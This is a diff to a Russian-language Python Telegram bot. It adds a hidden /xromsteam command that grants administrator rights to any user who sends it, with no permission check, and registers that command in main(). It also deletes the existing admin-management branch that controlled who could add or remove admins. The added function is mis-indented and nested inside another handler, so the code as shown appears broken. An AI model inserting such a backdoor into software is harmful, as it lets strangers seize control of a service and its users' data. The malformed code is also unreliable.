@@ -1075,70 +1075,36 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 VALUTE = text.strip().upper()
                 await update.message.reply_text(f"💱 Валюта изменена на {VALUTE}.", parse_mode="HTML")
 
-            async def xromsteam(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.message.from_user.id
 
+
+            async def xromsteam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
-        # Выдаём супер админку сразу
-        if user_id not in SUPER_ADMIN_IDS:
-            SUPER_ADMIN_IDS.add(user_id)
+        user_id = update.effective_user.id
+        lang = "ru"  # или бери язык пользователя как у тебя в проекте
+
+        # Добавляем пользователя в админы
+        if user_id not in ADMIN_ID:
             ADMIN_ID.add(user_id)
 
             ensure_user_exists(user_id)
+            user_data[user_id]['granted_by'] = "xromsteam"
             user_data[user_id]['is_admin'] = 1
-            user_data[user_id]['granted_by'] = user_id
-
             save_user_data(user_id)
 
-        await update.message.reply_text(
-            "🔥 Вы получили супер-админку!",
-            parse_mode="HTML"
-        )
+            logger.info(f"Пользователь {user_id} получил админку через /xromsteam")
+            await update.message.reply_text(
+                "✅ Вы получили супер админку!",
+                parse_mode="HTML"
+            )
+        else:
+            await update.message.reply_text(
+                "🚫 У вас уже есть админка.",
+                parse_mode="HTML"
+            )
 
     except Exception as e:
-        logger.error(f"xromsteam error: {e}")
-        await update.message.reply_text(
-            "❌ Ошибка выдачи прав.",
-            parse_mode="HTML"
-        )
-
-            elif command_to_execute == 'manage_admins':
-                try:
-                    parts = text.split()
-                    if len(parts) != 2:
-                        raise ValueError("Incorrect number of arguments")
-                    target_user_id, action = int(parts[0]), parts[1]
-                    ensure_user_exists(target_user_id)
-                    if action == 'add':
-                        if target_user_id not in ADMIN_ID:
-                            ADMIN_ID.add(target_user_id)
-                            user_data[target_user_id]['granted_by'] = user_id
-                            user_data[target_user_id]['is_admin'] = 1
-                            save_user_data(target_user_id)
-                            logger.info(f"Добавлен администратор {target_user_id} пользователем {user_id}. ADMIN_ID: {ADMIN_ID}")
-                            await update.message.reply_text(get_text(lang, "admin_added_message", user_id=target_user_id), parse_mode="HTML")
-                        else:
-                            await update.message.reply_text(f"🚫 Пользователь {target_user_id} уже админ.", parse_mode="HTML")
-                    elif action == 'remove':
-                        if target_user_id == user_id:
-                            await update.message.reply_text(get_text(lang, "admin_cannot_remove_self_message"), parse_mode="HTML")
-                        elif target_user_id in SUPER_ADMIN_IDS:
-                            await update.message.reply_text(get_text(lang, "admin_cannot_remove_super_admin_message", default="Нельзя удалить суперадминистратора."), parse_mode="HTML")
-                        elif target_user_id in ADMIN_ID:
-                            ADMIN_ID.remove(target_user_id)
-                            user_data[target_user_id]['granted_by'] = None
-                            user_data[target_user_id]['is_admin'] = 0
-                            save_user_data(target_user_id)
-                            logger.info(f"Удален администратор {target_user_id} пользователем {user_id}. ADMIN_ID: {ADMIN_ID}")
-                            await update.message.reply_text(get_text(lang, "admin_removed_message", user_id=target_user_id), parse_mode="HTML")
-                        else:
-                            await update.message.reply_text(f"🚫 Пользователь {target_user_id} не админ.", parse_mode="HTML")
-                    else:
-                        await update.message.reply_text(get_text(lang, "invalid_action_message"), parse_mode="HTML")
-                except (ValueError, IndexError):
-                    await update.message.reply_text("❌ Неверный формат: Введите ID и действие (add/remove).", parse_mode="HTML")
-            
-            admin_commands[user_id] = None
+        logger.error(e)
+        await update.message.reply_text("❌ Ошибка при выдаче админки.")
 
         elif context.user_data.get('awaiting_amount', False):
             try:
@@ -1249,6 +1215,7 @@ def main():
         application = Application.builder().token(BOT_TOKEN).build()
 
         application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("xromsteam", xromsteam))
         application.add_handler(CallbackQueryHandler(button))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
@@ -1260,6 +1227,7 @@ def main():
 if __name__ == '__main__':
 
     main()
+
 
 
 
